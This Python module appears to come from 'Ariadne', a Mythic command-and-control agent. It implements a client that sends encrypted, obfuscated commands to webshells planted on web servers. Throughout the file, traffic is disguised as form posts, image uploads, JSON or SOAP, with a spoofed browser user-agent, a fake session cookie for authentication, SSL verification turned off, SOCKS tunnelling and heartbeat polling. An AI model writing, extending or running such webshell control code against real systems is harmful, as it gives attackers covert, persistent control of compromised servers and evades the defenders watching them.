import re
import logging
from typing import Tuple, Optional
from dataclasses import dataclass, field

import aiohttp

from .evasion import (
    encode_payload,
    decode_payload,
    encrypt_payload,
    decrypt_payload,
    generate_deformed_alphabet,
)

logger = logging.getLogger("ariadne.webshell_rpc")

RESPONSE_MARKER_RE = re.compile(r'<span id="r">(.*?)</span>', re.DOTALL)


@dataclass
class WebshellConfig:
    webshell_url: str
    auth_method: str = "cookie"
    auth_name: str = "PHPSESSID"
    auth_value: str = ""
    encoding: str = "deformed_base64"
    deformed_alphabet: Optional[str] = None
    encryption: str = "aes256_cbc"
    aes_key: Optional[bytes] = None
    request_template: str = "form_post"
    request_param_name: str = "data"
    request_method: str = "POST"
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    extra_headers: dict = field(default_factory=dict)
    verify_ssl: bool = False


class WebshellRPC:
    """HTTP client that communicates with deployed Ariadne webshells."""

    def __init__(self, config: WebshellConfig):
        self.config = config
        self._session: Optional[aiohttp.ClientSession] = None

    async def _get_session(self) -> aiohttp.ClientSession:
        if self._session is None or self._session.closed:
            connector = aiohttp.TCPConnector(ssl=self.config.verify_ssl)
            self._session = aiohttp.ClientSession(connector=connector)
        return self._session

    async def close(self):
        if self._session and not self._session.closed:
            await self._session.close()
            self._session = None

    def _build_headers(self) -> dict:
        headers = {
            "User-Agent": self.config.user_agent,
        }
        headers.update(self.config.extra_headers)

        if self.config.auth_method == "header":
            headers[self.config.auth_name] = self.config.auth_value

        return headers

    def _build_cookies(self) -> dict:
        if self.config.auth_method == "cookie":
            return {self.config.auth_name: self.config.auth_value}
        return {}

    def _wrap_body(self, encoded_data: str) -> Tuple[str, str]:
        """Wrap encoded data in the configured request template.

        Returns (body_string, content_type).
        """
        from urllib.parse import quote

        tpl = self.config.request_template
        param = self.config.request_param_name

        if tpl == "form_post":
            return f"{param}={quote(encoded_data, safe='')}", "application/x-www-form-urlencoded"
        elif tpl == "json_api":
            import json
            return json.dumps({param: encoded_data}), "application/json"
        elif tpl == "image_data":
            return f"{param}={quote('data:image/png;base64,' + encoded_data, safe='')}", "application/x-www-form-urlencoded"
        elif tpl == "xml_soap":
            return (
                f'<?xml version="1.0"?>'
                f"<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">"
                f"<soap:Body><{param}>{encoded_data}</{param}></soap:Body>"
                f"</soap:Envelope>"
            ), "text/xml"
        else:
            return encoded_data, "application/octet-stream"

    def _encode_command(self, plaintext: str) -> str:
        """Encrypt and encode a plaintext command string."""
        raw = plaintext.encode("utf-8")

        if self.config.encryption == "aes256_cbc" and self.config.aes_key:
            raw = encrypt_payload(raw, self.config.aes_key)

        return encode_payload(raw, self.config.encoding, self.config.deformed_alphabet)

    def _decode_response(self, encoded: str) -> str:
        """Decode and decrypt a response string."""
        raw = decode_payload(encoded, self.config.encoding, self.config.deformed_alphabet)

        if self.config.encryption == "aes256_cbc" and self.config.aes_key:
            raw = decrypt_payload(raw, self.config.aes_key)

        return raw.decode("utf-8")

    async def send_command(
        self, action: str, task_id: str, *args: str
    ) -> Tuple[bool, str, str]:
        """Send a command to the webshell and return the parsed response.

        Returns (success, task_id, result_data).
        """
        parts = [action, task_id] + list(args)
        plaintext = "|".join(parts)

        encoded = self._encode_command(plaintext)
        body, content_type = self._wrap_body(encoded)

        headers = self._build_headers()
        headers["Content-Type"] = content_type
        cookies = self._build_cookies()

        if self.config.auth_method == "parameter":
            if self.config.request_template == "form_post":
                body = f"{self.config.auth_name}={self.config.auth_value}&{body}"

        session = await self._get_session()

        try:
            method = self.config.request_method.upper()
            async with session.request(
                method,
                self.config.webshell_url,
                data=body,
                headers=headers,
                cookies=cookies,
            ) as resp:
                html = await resp.text()

            match = RESPONSE_MARKER_RE.search(html)
            if not match:
                logger.error("No response marker found in webshell response")
                return False, task_id, "No response marker in webshell output"

            decoded = self._decode_response(match.group(1))
            parts = decoded.split("|", 2)

            if len(parts) < 3:
                return False, task_id, f"Malformed response: {decoded}"

            status, resp_task_id, result = parts
            return status == "0", resp_task_id, result

        except aiohttp.ClientError as e:
            logger.error(f"HTTP error communicating with webshell: {e}")
            return False, task_id, str(e)
        except Exception as e:
            logger.error(f"Error communicating with webshell: {e}")
            return False, task_id, str(e)

    async def send_tunnel_command(
        self, mark: str, tunnel_cmd: str, data: str = ""
    ) -> Tuple[bool, str]:
        """Send a SOCKS tunnel command to the webshell.

        Returns (success, response_data).
        """
        parts = ["tunnel", mark, tunnel_cmd]
        if data:
            parts.append(data)
        plaintext = "|".join(parts)

        encoded = self._encode_command(plaintext)
        body, content_type = self._wrap_body(encoded)

        headers = self._build_headers()
        headers["Content-Type"] = content_type
        cookies = self._build_cookies()

        session = await self._get_session()

        try:
            async with session.request(
                self.config.request_method.upper(),
                self.config.webshell_url,
                data=body,
                headers=headers,
                cookies=cookies,
            ) as resp:
                html = await resp.text()

            match = RESPONSE_MARKER_RE.search(html)
            if not match:
                return False, "No response marker"

            decoded = self._decode_response(match.group(1))
            parts = decoded.split("|", 1)

            if len(parts) < 2:
                return parts[0] == "0", ""

            return parts[0] == "0", parts[1]

        except Exception as e:
            logger.error(f"Tunnel command error: {e}")
            return False, str(e)

    async def poll(self, include_p2p: bool = True) -> dict:
        """Poll the webshell for liveness and optionally collect queued P2P messages.

        Returns dict with 'alive' bool and optional 'p2p_messages' list.
        """
        action = "poll_p2p" if include_p2p else "poll"
        plaintext = f"{action}|heartbeat"

        encoded = self._encode_command(plaintext)
        body, content_type = self._wrap_body(encoded)

        headers = self._build_headers()
        headers["Content-Type"] = content_type
        cookies = self._build_cookies()

        session = await self._get_session()

        try:
            async with session.request(
                self.config.request_method.upper(),
                self.config.webshell_url,
                data=body,
                headers=headers,
                cookies=cookies,
            ) as resp:
                html = await resp.text()

            match = RESPONSE_MARKER_RE.search(html)
            if not match:
                return {"alive": False, "p2p_messages": []}

            decoded = self._decode_response(match.group(1))
            result: dict = {"alive": True, "p2p_messages": []}

            if decoded.startswith("0|poll|"):
                p2p_data = decoded[7:]
                if p2p_data:
                    result["p2p_messages"] = p2p_data.split("\n")

            return result

        except Exception as e:
            logger.error(f"Poll error: {e}")
            return {"alive": False, "p2p_messages": []}

    async def check_alive(self) -> bool:
        """Lightweight liveness check."""
        result = await self.poll(include_p2p=False)
        return result.get("alive", False)


def create_rpc_from_build_params(build_params: dict, c2_params: dict) -> WebshellRPC:
    """Create a WebshellRPC instance from Mythic build and C2 parameters."""
    encoding = build_params.get("encoding", "deformed_base64")
    encoding_password = build_params.get("encoding_password", "")

    deformed_alphabet = None
    if encoding == "deformed_base64" and encoding_password:
        deformed_alphabet = generate_deformed_alphabet(encoding_password)

    aes_key = None
    encryption = build_params.get("encryption", "none")
    if encryption == "aes256_cbc":
        import base64
        aes_key_b64 = build_params.get("aes_key", "")
        if aes_key_b64:
            aes_key = base64.b64decode(aes_key_b64)

    extra_headers = {}
    extra_headers_str = build_params.get("extra_headers", "")
    if extra_headers_str:
        for line in extra_headers_str.strip().split("\n"):
            if ":" in line:
                key, val = line.split(":", 1)
                extra_headers[key.strip()] = val.strip()

    config = WebshellConfig(
        webshell_url=c2_params.get("webshell_url", ""),
        auth_method=build_params.get("auth_method", "cookie"),
        auth_name=build_params.get("auth_name", "PHPSESSID"),
        auth_value=build_params.get("auth_value", ""),
        encoding=encoding,
        deformed_alphabet=deformed_alphabet,
        encryption=encryption,
        aes_key=aes_key,
        request_template=build_params.get("request_template", "form_post"),
        request_param_name=build_params.get("request_param_name", "data"),
        request_method=build_params.get("request_method", "POST"),
        user_agent=c2_params.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"),
        extra_headers=extra_headers,
        verify_ssl=build_params.get("verify_ssl", False),
    )

    return WebshellRPC(config)
